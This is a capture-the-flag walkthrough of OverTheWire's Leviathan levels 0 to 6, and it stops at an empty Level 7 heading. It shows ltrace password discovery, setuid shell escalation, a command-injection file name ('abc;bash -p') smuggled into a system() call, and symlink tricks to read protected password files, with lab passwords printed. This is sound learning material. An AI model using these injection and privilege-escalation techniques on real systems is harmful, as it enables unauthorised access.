## Leviathan
#### Level 0
Login to the first level with the credentials:

> Host: **leviathan.labs.overthewire.org** <br>
> Port: 2223 <br>
> Username: **leviathan0** <br>
> Password: **leviathan0** <br>

`ssh leviathan0@leviathan.labs.overthewire.org -p 2223`

---

#### Level 1
If you try and list all normal files in the root directory you will find there are none. However, listing all files including hidden ones will net you the usual `.bash_logout`, `.bashrc` and `.profile` files, but also another one called `.backup`.

You will find a `bookmarks.html` file within the `.backup` directory.

Reading the entire file with `cat` will yield a massive heap of results.

One might find it natural to use `grep` to search for the word 'password' in the HTML document.

`grep "password" bookmarks.html`

```bash
leviathan0@gibson:~/.backup$ grep "password" bookmarks.html
<DT><A HREF="http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is 3QJ3TgzHDq" ADD_DATE="1155384634" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">password to leviathan1</A>
```

Password: 3QJ3TgzHDq

---

#### Level 2
There is one file in the root directory called `check` which happens to be a setuid binary file.

You can try test the program to see what it does:

```bash
leviathan1@gibson:~$ ./check
password: dsadsa
Wrong password, Good Bye ...
```

It seems that the only way would be to figure out what the password is.

`ltrace` is a very useful program that simply runs a specified command until it exits. It records the dynamic library calls that are called from the executable and the signals which are received by the process. Refer to the [ltrace](https://man7.org/linux/man-pages/man1/ltrace.1.html) documentation.

To put it simply, it is able to (in a sense) print every step of the program and what is going on behind the scenes.

Using `ltrace` and running `check` yields:

```
leviathan1@gibson:~$ ltrace ./check
__libc_start_main(0x80490ed, 1, 0xffffd494, 0 <unfinished ...>
printf("password: ")                        = 10
getchar(0, 0, 0x786573, 0x646f67password: rea
)           = 114
getchar(0, 114, 0x786573, 0x646f67)         = 101
getchar(0, 0x6572, 0x786573, 0x646f67)      = 97
strcmp("rea", "sex")                        = -1
puts("Wrong password, Good Bye ..."Wrong password, Good Bye ...
)        = 29
+++ exited (status 0) +++
```

What you will find curiously, is that the program seems to compare your password input to another string, "sex". That could in fact be the correct password.

So, why not try "sex" instead as the password?

```
leviathan1@gibson:~$ ltrace ./check
__libc_start_main(0x80490ed, 2, 0xffffd484, 0 <unfinished ...>
printf("password: ")                        = 10
getchar(0, 0, 0x786573, 0x646f67password: sex
)           = 115
getchar(0, 115, 0x786573, 0x646f67)         = 101
getchar(0, 0x6573, 0x786573, 0x646f67)      = 120
strcmp("sex", "sex")                        = 0
geteuid()                                   = 12001
geteuid()                                   = 12001
setreuid(12001, 12001)                      = 0
system("/bin/sh"
```

You can see that inputting "sex" as the password results in a different output. It again compares the two strings, and because they match, it gets the effective user ID of the calling process, leviathan2 (because the setuid binary file runs as leviathan2). It then sets the real and effective user IDs as leviathan2. At the end, it calls the system to spawn a new shell.

Now that we know this works, we can try running the program now for real without `ltrace`:

```bash
$ ./check
password: sex
$ whoami
leviathan2
```

And just like that, you are now running a new bash shell as leviathan2.

From here, it is very simple. Leviathan2 has access to its login password, so just read from `/etc/leviathan_pass/leviathan2`.

> **Extra Information**
> - [geteuid](https://linux.die.net/man/2/geteuid)
> - [setreuid](https://man7.org/linux/man-pages/man2/setreuid.2.html)
> - [What is Real and Effective user ID?](https://stackoverflow.com/questions/32455684/difference-between-real-user-id-effective-user-id-and-saved-user-id#:~:text=So%2C%20the%20real%20user%20id,%2C%20there%20are%20some%20exceptions)
> <br> <br>

Password: NsN1HwFoyN

---

#### Level 3
This time, the root directory has a setuid binary file `printfile`.

Running this gives some background info on how it works:

```bash
leviathan2@gibson:~$ ./printfile
*** File Printer ***
Usage: ./printfile filename
```

You can try it with a file that leviathan2 has access to, let's say `.bash_logout`:

```bash
leviathan2@gibson:~$ ./printfile .bash_logout
# ~/.bash_logout: executed by bash(1) when login shell exits.

# when leaving the console clear the screen to increase privacy

if [ "$SHLVL" = 1 ]; then
    [ -x /usr/bin/clear_console ] && /usr/bin/clear_console -q
fi
```

It prints the contents of the file.

You might think to try using the executable to print the password file located in `/etc/leviathan_pass/leviathan3`:

```bash
leviathan2@gibson:~$ ./printfile /etc/leviathan_pass/leviathan3
You cant have that file...
```

But alas, it is not easy as it seems.

Again, you can make use of `ltrace` to see the inner workings of the program:

```bash
leviathan2@gibson:~$ ltrace ./printfile .bash_logout
__libc_start_main(0x80490ed, 2, 0xffffd474, 0 <unfinished ...>
access(".bash_logout", 4)                   = 0
snprintf("/bin/cat .bash_logout", 511, "/bin/cat %s", ".bash_logout") = 21
geteuid()                                   = 12002
geteuid()                                   = 12002
setreuid(12002, 12002)                      = 0
system("/bin/cat .bash_logout"# ~/.bash_logout: executed by bash(1) when login shell exits.

# when leaving the console clear the screen to increase privacy

if [ "$SHLVL" = 1 ]; then
    [ -x /usr/bin/clear_console ] && /usr/bin/clear_console -q
fi
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                      = 0
+++ exited (status 0) +++
```

You can see that it first checks whether the real user ID has permissions (leviathan2, not leviathan3) to access the file with the [access()](https://man7.org/linux/man-pages/man2/access.2.html) command. It then concatenates `/bin/cat` with the file as a string. At the end, `system()` executes that string.

Based on this, it can be deduced that the reason why you cannot simply access `/etc/leviathan_pass/leviathan3` is because it fails the very first check from `access()`.

So, as long as you can bypass the first check, `system()` will run with the permissions of leviathan3.

There are a multitude of ways you can solve this, here are two:

##### Approach #1 (Courtesy of [rtmoran](https://rtmoran.org/overthewire-leviathan-level-2/))
Create a temporary directory and make sure to change the permissions so it can be accessed by the executable.

Next, you can exploit the way `snprintf()` concatenates and passes on a string to `system()` by creating a new file called `abc;bash -p`.

> Note that bash commands are separated using `;` or `&&`.

If you now run the binary executable with the newly created file:

```bash
leviathan2@gibson:/tmp/tmp.8pA9XQ2qoU$ ~/./printfile abc\;bash\ -p
/bin/cat: abc: No such file or directory
leviathan3@gibson:/tmp/tmp.8pA9XQ2qoU$ whoami
leviathan3
```

It passes the `access()` check, and then the file is concatenated with `/bin/cat` and passed onto `system()`. This then attempts to execute `/bin/cat abc` first, but fails because there is no such file, then executes `bash -p` with the `-p` retaining the permissions of the effective user (leviathan3).

Again, now that you have a running shell as leviathan3, it is as easy as reading the password from `/etc/leviathan_pass/leviathan3`.

##### Approach #2 (Courtesy of [MayADevBe](https://mayadevbe.me/posts/overthewire/leviathan/level3/))
Create a temporary directory and change the permissions so it can be accessed by the executable.

One way to find exploits/vulnerabilities is to test all possible inputs to the program and observe the result.

For example, what if we have a file with a space?

```bash
leviathan2@gibson:/tmp/tmp.guZgSnzmHw$ touch "example file.txt"
leviathan2@gibson:/tmp/tmp.guZgSnzmHw$ ltrace ~/./printfile "example file.txt"
__libc_start_main(0x80490ed, 2, 0xffffd434, 0 <unfinished ...>
access("example file.txt", 4)               = 0
snprintf("/bin/cat example file.txt", 511, "/bin/cat %s", "example file.txt") = 25
geteuid()                                   = 12002
geteuid()                                   = 12002
setreuid(12002, 12002)                      = 0
system("/bin/cat example file.txt"/bin/cat: example: No such file or directory
/bin/cat: file.txt: No such file or directory
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                      = 256
+++ exited (status 0) +++
```

What you find is that the program uses the full file name to determine if the real user has permission to access the file, but the `system()` only runs for the first part of the filename "example".

You can exploit this by creating a new file with the name "example" that links to `/etc/leviathan_pass/leviathan3`. Read more about [links](https://www.linux.com/topic/desktop/understanding-linux-links/). By usual means you would not be able to access the password with the file but the binary executable runs effectively as leviathan3 after passing the `access()` so with this you have a loophole.

```bash
leviathan2@gibson:/tmp/tmp.guZgSnzmHw$ ln -s /etc/leviathan_pass/leviathan3 example
leviathan2@gibson:/tmp/tmp.guZgSnzmHw$ ls
example  example file.txt
leviathan2@gibson:/tmp/tmp.guZgSnzmHw$ ~/./printfile "example file.txt"
f0n8h2iWLP
/bin/cat: file.txt: No such file or directory
```

The executable bypasses the `access()` check because it reads the full file "example file.txt" and confirms that the real user (leviathan2) has permissions to access the file. It then proceeds to execute `/bin/cat example` after changing the effective user ID to leviathan3, making it possible to read the password.

Password: f0n8h2iWLP

---

#### Level 4
This level is almost identical to [Level 2](#level-2) in terms of its approach.

You have a setuid binary file `level3` in the root directory.

Testing it with some arbitrary output yields:

```bash
leviathan3@gibson:~$ ./level3
Enter the password> abc
bzzzzzzzzap. WRONG
```

Again, we can use ltrace to investigate what is going on behind the scenes.

```bash
leviathan3@gibson:~$ ltrace ./level3
__libc_start_main(0x80490ed, 1, 0xffffd494, 0 <unfinished ...>
strcmp("h0no33", "kakaka")                                                 = -1
printf("Enter the password> ")                                             = 20
fgets(Enter the password> abc
"abc\n", 256, 0xf7fae5c0)                                            = 0xffffd26c
strcmp("abc\n", "snlprintf\n")                                             = -1
puts("bzzzzzzzzap. WRONG"bzzzzzzzzap. WRONG
)                                                 = 19
+++ exited (status 0) +++
```

You can see that the program takes the input and compares it with the string "snlprintf". 

This time, try inputting the password as "snlprintf":

```bash
leviathan3@gibson:~$ ltrace ./level3
__libc_start_main(0x80490ed, 2, 0xffffd474, 0 <unfinished ...>
strcmp("h0no33", "kakaka")                                                 = -1
printf("Enter the password> ")                                             = 20
fgets(Enter the password> snlprintf
"snlprintf\n", 256, 0xf7fae5c0)                                      = 0xffffd24c
strcmp("snlprintf\n", "snlprintf\n")                                       = 0
puts("[You've got shell]!"[You've got shell]!
)                                                = 20
geteuid()                                                                  = 12003
geteuid()                                                                  = 12003
setreuid(12003, 12003)                                                     = 0
system("/bin/sh"
```

Just like in [Level 2](#level-2), inputting "snlprintf" makes the string comparison return true, and instead of giving an incorrect password message, fetches the effective user ID (leviathan4), sets the user ID as the effective user ID and runs a new shell.

Now simply run the program as is without `ltrace`.

```bash
$ ./level3 ssnlprintf
Enter the password> snlprintf
[You've got shell]!
$ whoami
leviathan4
```

You now are running a new shell session as leviathan4. Given this, it is as easy as grabbing the password with `cat /etc/leviathan_pass/leviathan4`.

Password: WG1egElCvO

---

#### Level 5
Using the base `ls`, you will find that there are no files.

Try listing all files including hidden ones:

```bash
leviathan4@gibson:~$ ls  -la
total 24
drwxr-xr-x  3 root root       4096 Sep 19 07:07 .
drwxr-xr-x 83 root root       4096 Sep 19 07:09 ..
-rw-r--r--  1 root root        220 Mar 31  2024 .bash_logout
-rw-r--r--  1 root root       3771 Mar 31  2024 .bashrc
-rw-r--r--  1 root root        807 Mar 31  2024 .profile
dr-xr-x---  2 root leviathan4 4096 Sep 19 07:07 .trash
```

Curiously, there is a directory called `.trash`.

Navigating into it, you will find a setuid binary file once again called `bin`.

Running this yields:

```bash
leviathan4@gibson:~/.trash$ ./bin
00110000 01100100 01111001 01111000 01010100 00110111 01000110 00110100 01010001 01000100 00001010
```

It outputs a string of binary in blocks of 8-bits.

In order to convert this back into ASCII text, you can very easily search up online for a binary to ASCII text converter, however this can also be done more painfully within the shell.

[Perl](https://en.wikipedia.org/wiki/Perl) is a programming language that stands for Practical Extraction and Report Language because it was originally designed for scanning text files, extracting information and printing reports based on it. It is now a general-purpose programming language that is very practical and can be quite useful to perform tasks that would otherwise be very troublesome to do in bash.

> - [Linux Perl Command Overview](https://www.computerhope.com/unix/uperl.htm)
> - [Perl Command Line Options](https://www.perl.com/pub/2004/08/09/commandline.html/)
> - A very helpful resource from StackExchange on [ASCII-Binary & Binary-ASCII](https://unix.stackexchange.com/questions/98948/ascii-to-binary-and-binary-to-ascii-conversion-tools).

If you have a search on how to convert binary to ASCII you will come across a helpful StackExchange thread linked above. The relevant line is:

`perl -lape '$_=pack"(B8)*",@F'`

The `-l` flag tells Perl to automatically add a newline character after each line of output.

The `-a` splits each line of input into an array, with the delimiter being a space. The elements are stored in an array called `@F`.

The `-p` tells Perl to process each line of input and automatically print it after executing the line.

The `-e` is for executing code you provide as an argument in single quotes.

For the actual code `$_=pack"(B8)*",@F'`;

The `$_` is the default variable in Perl that holds the current line of input. In this case, it is set to whatever the output of `pack` is.

`pack` is a function that takes a format such as `"(B8)*"` and a list of elements like `@F`. The `"(B8)*"` here indicates that you want `pack` to treat the elements as binary strings (with each being 8 bits), and convert them into their corresponding characters.

Now, just feed the output of `./bin` to the `perl` command with a pipe.

```bash
leviathan4@gibson:~/.trash$ ./bin | perl -lape '$_=pack"(B8)*",@F'
0dyxT7F4QD

```

Password: 0dyxT7F4QD

---

#### Level 6
You will find another setuid binary file `leviathan5` in the root directory.

Running it gives you a message, "Cannot find /tmp/file.log".

The next logical step would be to create a file called `file.log` in the `/tmp` directory and run the binary file again to see what it happens.

```bash
leviathan5@gibson:~$ touch /tmp/file.log
leviathan5@gibson:~$ ltrace ./leviathan5
__libc_start_main(0x804910d, 1, 0xffffd484, 0 <unfinished ...>
fopen("/tmp/file.log", "r")                                   = 0x804d1a0
fgetc(0x804d1a0)                                              = '\377'
feof(0x804d1a0)                                               = 1
fclose(0x804d1a0)                                             = 0
getuid()                                                      = 12005
setuid(12005)                                                 = 0
unlink("/tmp/file.log")                                       = 0
+++ exited (status 0) +++
```

You can see that this time it yields a different output since the `/tmp/file.log` is present. The first four commands are part of C; `fopen("/tmp/file.log", "r")` opens the file in read mode, the `fgetc` command gets the contents of a file one character at a time and returns the ASCII code for the characters read, the `feof` command checks for the end of a file, and `fclose` closes the file. Afterwards, `getuid()` gets the real user ID (leviathan5) and `setuid` sets the effective user ID as leviathan5 (originally leviathan6). The last command `unlink` can be used like the `rm` command to delete files and directories but the difference is that it can also be used to remove symbolic links from files.

With this in mind, because the initial few commands are run with the effective user ID of leviathan6, you could create a symbolic link to the file `/etc/leviathan_pass/leviathan6`; that way when the binary file is executed, it would read and return the contents of the password.

```bash
leviathan5@gibson:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
leviathan5@gibson:~$ ./leviathan5
szo7HDB88w
```

Password: szo7HDB88w

---

#### Level 7
